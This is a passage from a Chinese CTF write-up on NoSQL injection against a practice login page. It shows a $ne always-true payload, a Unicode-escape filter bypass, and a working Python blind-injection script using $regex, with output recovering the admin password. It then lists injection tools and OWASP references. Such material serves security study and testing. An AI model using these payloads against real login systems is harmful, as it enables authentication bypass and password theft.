![image-20210724160301345](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ef196f1abe237114cb7e5664ccccd7078c7456be.png)

首先构造永真式：

```json
{"username":{"$ne":1},"password": {"$ne":1}}
```

![image-20210724160516228](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c30efa06ab1bb6030dfee847f0525fe006bc424e.png)

被检测了，使用 Unicode 编码成功绕过：

![image-20210724160601628](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fe8d947994c89572fdb96952ff0529bf712f0ff1.png)

应该是通过 Nosql 盲注，让我们把 admin 的密码爆出来，根据以下条件进行布尔盲注：

```json
{"msg":"登录了，但没完全登录"}    // 真
{"msg":"登录失败"}    // 假
```

如下编写盲注脚本：

```python
import requests
import string

password = ''
url = 'http://node4.buuoj.cn:27409/login.php'

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:

            # When the method is GET
            get_payload = '?username=admin&password[$regex]=^%s' % (password + c)
            # When the method is POST
            post_payload = {
                "username": "admin",
                "password[$regex]": '^' + password + c
            }
            # When the method is POST with JSON
            json_payload = """{"username":"admin", "password":{"\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078":"^%s"}}""" % (password + c)
            headers = {'Content-Type': 'application/json'}
            r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json

            #r = requests.post(url=url, data=post_payload)
            if '但没完全登录' in r.content.decode():
                print("[+] %s" % (password + c))
                password += c

# 输出:
# [+] 4
# [+] 42
# [+] 422
# [+] 4227
# [+] 42276
# [+] 422766
# ......
# [+] 42276606202db06ad1f29ab6b4a1
# [+] 42276606202db06ad1f29ab6b4a13
# [+] 42276606202db06ad1f29ab6b4a130
# [+] 42276606202db06ad1f29ab6b4a1307
# [+] 42276606202db06ad1f29ab6b4a1307f
```

得到 admin 密码后即可成功登录 admin。

Nosql 注入相关工具
------------

Github上有个叫[NoSQLAttack](https://github.com/youngyangyang04/NoSQLAttack)工具，不过已经没有维护了。

另外还有一个[NoSQLMap](https://github.com/codingo/NoSQLMap)工具，这个项目作者仍在维护。

Ending......
------------

> 参考：
> 
> [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/05.6-Testing\_for\_NoSQL\_Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
> 
> <https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf>
> 
> <https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html>
> 
> <https://cloud.tencent.com/developer/article/1602092>
> 
> <https://www.anquanke.com/post/id/97211#h2-10>
> 
> <https://www.runoob.com/mongodb/nosql.html>
> 
> <https://blog.szfszf.top/article/27/>
> 
> <https://www.ddosi.com/b292/>
> 
> <https://github.com/youngyangyang04/NoSQLInjectionAttackDemo>
> 
> <https://github.com/ricardojoserf/NoSQL-injection-example>